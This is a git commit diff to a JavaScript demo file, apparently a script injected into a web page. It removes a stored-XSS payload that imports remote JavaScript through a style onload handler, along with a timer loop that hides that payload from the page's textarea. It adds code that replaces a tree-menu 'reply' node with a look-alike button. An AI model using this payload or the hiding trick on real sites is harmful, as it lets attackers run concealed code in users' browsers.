123ca8a4c5e67946dd797b9a4295b87aa982203e
Camaro <cstcamaro@gmail.com>
2022-03-06 22:24:13 +0800

    Update hiddendemo.js

--- hiddendemo.js
+++ hiddendemo.js
@@ -1,12 +1,29 @@
-function foo() {
-    let code = "<style onload=import(`https://cstcamaro.github.io/JustKnowInvoke2/hiddendemo.js`)>"
-    var textareaNode = document.getElementsByTagName("textarea")[0];
-    let value = textareaNode.value;
-    let innerText = textareaNode.innerText;
-    if (value != "" || innerText != "") {
-        textareaNode.value = value.replace(code, "");
-        textareaNode.innerText = innerText.replace(code, "");
+const buttonText = "回复1"
+let ulNode = document.getElementsByClassName("ant-tree-child-tree ant-tree-child-tree-open")[0]
+ulNode.childNodes.forEach(function (childNode) {
+    if (childNode.innerHTML.indexOf(buttonText) > -1) {
+        let tagId = "random_string";
+        childNode.setAttribute("id", tagId);
+        childNode.removeChild(childNode.childNodes[1]);
+        addNewTag(tagId);
+    }
+})
+
+function addNewTag(tagId) {
+    let spannode = document.createElement("span");
+    spannode.setAttribute("class", "ant-tree-node-content-wrapper ant-tree-node-content-wrapper-normal");
+    let spannode2 = document.createElement("span");
+    spannode2.setAttribute("class", "ant-tree-title");
+    let a = document.createElement("a");
+    a.innerText = buttonText;
+    spannode2.appendChild(a);
+    spannode.appendChild(spannode2);
+    $("#" + tagId).appendChild(spannode);
+    spannode.onclick = function () {
+        let someString = "hello world";
+        let textNode = document.getElementsByTagName("textarea")[0];
+        let oldValue = textNode.value;
+        let newValue = oldValue + someString;
+        textNode.value = newValue;
     }
 }
-
-setInterval(foo, 10);
